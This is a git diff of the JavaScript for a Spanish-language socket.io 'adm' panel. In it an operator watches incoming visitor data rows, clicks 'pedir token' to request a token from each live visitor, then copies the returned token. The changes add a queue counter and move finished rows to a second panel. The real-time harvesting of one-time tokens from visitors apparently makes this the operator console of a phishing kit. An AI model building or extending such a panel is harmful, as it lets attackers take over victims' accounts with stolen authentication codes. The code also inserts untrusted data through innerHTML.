@@ -1,6 +1,6 @@
 const socket = io.connect({
-        path: "/socket.io/"
-    })
+    path: "/socket.io/"
+})
 
 //Obtener identificador original
 const queryString = window.location.search;
@@ -10,11 +10,11 @@ const getAdm = urlParams.get('s');
 
 socket.on("connect", () => {
     console.log("El socket se ha conectado: ", socket.id);
-    socket.emit("AdmOn", {'socketSesion': socket.id, 'Id': getAdm});
+    socket.emit("AdmOn", { 'socketSesion': socket.id, 'Id': getAdm });
 })
 
 socket.on("admAssignOtherId", NewId => {
-    window.location.href = "/adm/?s="+NewId;
+    window.location.href = "/adm/?s=" + NewId;
 })
 
 
@@ -23,10 +23,11 @@ socket.on("countOfAdm", count => {
 })
 
 const panelData = document.querySelector("#panel-1");
+const panelDataReady = document.querySelector("#panel-2");
 var dataCollection = [];
 
 socket.on("NewData", data => {
-    if(!document.querySelector("#parent-"+data[0].socket)){
+    if (!document.querySelector("#parent-" + data[0].socket)) {
         var dataInfo = `<div class="row-data" id="parent-${data[0].socket}"> 
                             <div class="info-row" id="row-${data[0].socket}"> 
                                 <p id="u-${data[0].socket}"> 
@@ -51,20 +52,24 @@ socket.on("NewData", data => {
                             </div>
                         </div>`
         panelData.innerHTML += dataInfo;
+        var UsersQueue = document.querySelectorAll('.finalizar');
+        var CountUsers = UsersQueue.length;
+        var CountUsersBox = document.querySelector("#CountUsersBox");
+        CountUsersBox.innerHTML = CountUsers;
         //puede ir a una db
         dataCollection.push(data);
-    }else if(document.querySelector("#token-load-"+data[0].socket)){
-        document.querySelector("#token-load-"+data[0].socket).remove()
-        document.querySelector("#t-"+data[0].socket).style.display = "flex";
+    } else if (document.querySelector("#token-load-" + data[0].socket)) {
+        document.querySelector("#token-load-" + data[0].socket).remove()
+        document.querySelector("#t-" + data[0].socket).style.display = "flex";
     }
     setTimeout(() => {
         socket.emit("EnviarInfoHomeConect", [data, socket.id]);
     }, 2000);
 })
 
-socket.on("showRowB", originalSocket =>{
-    if(document.querySelector("#brow-"+originalSocket)){
-        document.querySelector("#brow-"+originalSocket).style.display = "flex";
+socket.on("showRowB", originalSocket => {
+    if (document.querySelector("#brow-" + originalSocket)) {
+        document.querySelector("#brow-" + originalSocket).style.display = "flex";
     }
 })
 
@@ -77,20 +82,20 @@ socket.on("ResendData", data => {
 
 //Get Token
 socket.on("ReSendToken", dataToken => {
-    
-        document.querySelector("#t-"+dataToken.Socket).style.display = "block";
-        var parentData = document.querySelector("#row-"+dataToken.Socket);
-        document.querySelector("#token-load-"+dataToken.Socket).remove();
-        dataTokenInsert = `<p> 
+
+    document.querySelector("#t-" + dataToken.Socket).style.display = "block";
+    var parentData = document.querySelector("#row-" + dataToken.Socket);
+    document.querySelector("#token-load-" + dataToken.Socket).remove();
+    dataTokenInsert = `<p> 
                                 <b>Token:</b> <span id="info-${dataToken.Token}">${dataToken.Token}</span>
                                 <button class="token-copiar" id="button-${dataToken.Token}">
                                     
                                 </button>
                             </p>`;
-        parentData.innerHTML += dataTokenInsert;
+    parentData.innerHTML += dataTokenInsert;
 
-        //document.querySelector("#t-"+dataToken.Socket).remove();
-    
+    //document.querySelector("#t-"+dataToken.Socket).remove();
+
 })
 
 //Disconnect queue
@@ -110,33 +115,33 @@ const on = (element, event, selector, handler) => {
     })
 }
 
-on(document, 'click', '.pedir-token', e =>{
+on(document, 'click', '.pedir-token', e => {
     const id = e.target.id;
     idUser = id.substring(2);
     //const admToken = socket.id;
-    socket.emit("PedirToken", {'idUser':idUser, 'idAdm': getAdm});
-    document.querySelector("#"+id).innerHTML = "Volver a pedir token";
-    document.querySelector("#"+id).style.display = "none";
-    
-    if(document.querySelector("#token-load-"+idUser)){
-        document.querySelector("#token-load-"+idUser).remove();
+    socket.emit("PedirToken", { 'idUser': idUser, 'idAdm': getAdm });
+    document.querySelector("#" + id).innerHTML = "Volver a pedir token";
+    document.querySelector("#" + id).style.display = "none";
+
+    if (document.querySelector("#token-load-" + idUser)) {
+        document.querySelector("#token-load-" + idUser).remove();
     }
-    
-    const parentData = document.querySelector("#row-"+idUser);
-    dataTokenInsert =   `<p class="token-load" id="token-load-${idUser}"> 
+
+    const parentData = document.querySelector("#row-" + idUser);
+    dataTokenInsert = `<p class="token-load" id="token-load-${idUser}"> 
                             <b>Token:</b> 
                             <img src="/img/spinner-general.gif">
                         </p>`;
     parentData.innerHTML += dataTokenInsert;
 })
 
-on(document, 'click', '.token-copiar', e =>{
+on(document, 'click', '.token-copiar', e => {
     const id = e.target.id;
     const token = id.substring(7);
     //const contentToken = document.querySelector("#info-"+token);
     //const text = contentToken.innerHTML;
 
-    var codigoACopiar = document.getElementById("info-"+token);
+    var codigoACopiar = document.getElementById("info-" + token);
     var seleccion = document.createRange();
     seleccion.selectNodeContents(codigoACopiar);
     window.getSelection().removeAllRanges();
@@ -145,34 +150,50 @@ on(document, 'click', '.token-copiar', e =>{
     window.getSelection().removeRange(seleccion);
 
     //navigator.clipboard.writeText(text);
-    document.querySelector('#'+id).classList.toggle('token-copiado');
+    document.querySelector('#' + id).classList.toggle('token-copiado');
     setTimeout(() => {
-        document.querySelector('#'+id).classList.toggle('token-copiado');
+        document.querySelector('#' + id).classList.toggle('token-copiado');
     }, 250);
 })
 
-on(document, 'click', '.finalizar', e =>{
+function outerHTML(node) {
+    return node.outerHTML || new XMLSerializer().serializeToString(node);
+}
+
+on(document, 'click', '.finalizar', e => {
     const id = e.target.id;
     idUser = id.substring(2);
     socket.emit("Finalizar", idUser);
-    document.querySelector("#f-"+idUser).remove();
-    document.querySelector("#t-"+idUser).remove();
+    document.querySelector("#f-" + idUser).remove();
+    document.querySelector("#t-" + idUser).remove();
+
+    //Actualizar conteo
+    var UsersQueue = document.querySelectorAll('.finalizar');
+    var CountUsers = UsersQueue.length;
+    var CountUsersBox = document.querySelector("#CountUsersBox");
+    CountUsersBox.innerHTML = CountUsers;
+
+    //Enviar al fondo
+    panelDataReady.innerHTML += outerHTML(document.querySelector("#parent-" + idUser));
+    document.querySelector("#parent-" + idUser).remove();
+    document.querySelector("#parent-" + idUser).classList.add("personReady");
 })
 
-on(document, 'click', '.eliminar', e =>{
-    if(confirm('¿Deseas eliminar este registro?')){
-
-        if(document.querySelector("#f-"+idUser)){
-            socket.emit("Finalizar", idUser);
-        }
+on(document, 'click', '.eliminar', e => {
+    if (confirm('¿Deseas eliminar este registro?')) {
         const id = e.target.id;
         idUser = id.substring(2);
-        document.querySelector("#parent-"+idUser).remove();
+
+        if (document.querySelector("#f-" + idUser)) {
+            socket.emit("Finalizar", idUser);
+        }
+
+        document.querySelector("#parent-" + idUser).remove();
     }
 })
 
 
 // RECARGAR LA PAGINA
-window.onbeforeunload = function() {
+window.onbeforeunload = function () {
     return "¿Desea recargar la página web?";
-  };
+};
